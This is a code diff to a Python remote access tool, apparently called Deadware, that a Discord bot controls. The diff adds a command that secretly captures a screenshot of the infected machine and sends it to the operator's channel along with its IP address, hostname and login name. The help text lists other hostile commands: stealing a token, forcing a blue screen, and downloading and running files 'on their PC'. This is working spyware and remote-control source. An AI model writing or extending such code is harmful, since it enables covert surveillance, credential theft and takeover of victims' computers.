@@ -9,7 +9,7 @@ from win32api import *
 from win32con import *
 from win32file import *
 from win32gui import *
-
+import platform
 ### CONFIG ###
 global chanid #ignore this
 global bottoken #ignore this
@@ -23,6 +23,8 @@ try:
     import discord
     from discord import Permissions
     from discord.ext import commands
+    import pyautogui
+    import pathlib
 except Exception:
     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Please install requirements')
 
@@ -43,7 +45,8 @@ prefix = config.get('prefix')
 nitro_sniper = config.get('nitro_sniper')
 
 Deadware = commands.Bot(description='Deadware', command_prefix='d!', bot=True)
-
+Chrs = list(string.ascii_letters + string.digits) # random string and digits. will be used for the screenshot's file name the screenshot's file name will contain random digits and chars to avoid exceptions, overwriting.
+Shrs = "".join(random.choices(Chrs,k=5)) # combine 
 Deadcord = discord.Client()
 Deadcord = commands.Bot(description='Deadcord Selfbot', command_prefix=prefix, self_bot=True)
 Deadcord.remove_command('help')
@@ -882,6 +885,37 @@ async def computer_shutdown(ctx):
         await ctx.send('Could not shutdown computer')
 
 @Deadware.command()
+async def get_screenshot(ctx):
+    #F_del:bool = False
+    #if F_del == True:
+    #    try:
+    #        os.remove(scrn_name)
+    #        F_del = False
+    #        return
+    #    except:
+    #        await ctx.send("Couldn't delete the earlier screenshot. Will `try` to delete the screenshot in the next call of the `get_screenshot` command.")
+    #        await ctx.send("Continuing....")
+    await ctx.send("Processing....")
+    scrn = pyautogui.screenshot()
+    localpath = pathlib.Path(__file__).resolve().parent
+    scrn_name = f"{localpath}\\Screenshot_{Shrs}.png"
+    scrn.save(scrn_name)
+    time.sleep(4) # make sure the screenshot is taken.
+    try:
+        await ctx.send(f"Screenshot of : ` {GetIP()} {platform.node()} | {os.getlogin()}`",file=discord.File(scrn_name))
+        try:
+            os.remove(scrn_name)
+            #if F_del == True:
+            #    F_del = False
+            #    return
+        except:
+            await ctx.send("Error: Couldn't delete the screenshot.")
+            #F_del = True
+    except:
+        await ctx.send("Error: Something went wrong during the sending procedure of screenshot.")
+
+        
+@Deadware.command()
 async def deadware_bomb(ctx):
     await ctx.message.delete()
     user = getpass.getuser()
@@ -897,7 +931,7 @@ async def deadware_bomb(ctx):
 async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title='Deadware Commands', description=' ', colour=RandomColor())
-    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC\ncwd - gets currenct working directory\ndir - lists folders in directory\next_search <file extention> - searches for file with extention\nchange_dir <folder> - changes file directory')
+    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC\ncwd - gets currenct working directory\ndir - lists folders in directory\next_search <file extention> - searches for file with extention\nchange_dir <folder> - changes file directory\nget_screenshot - sends a current screenshot of the machine')
 
     await ctx.send(embed=embed)
 
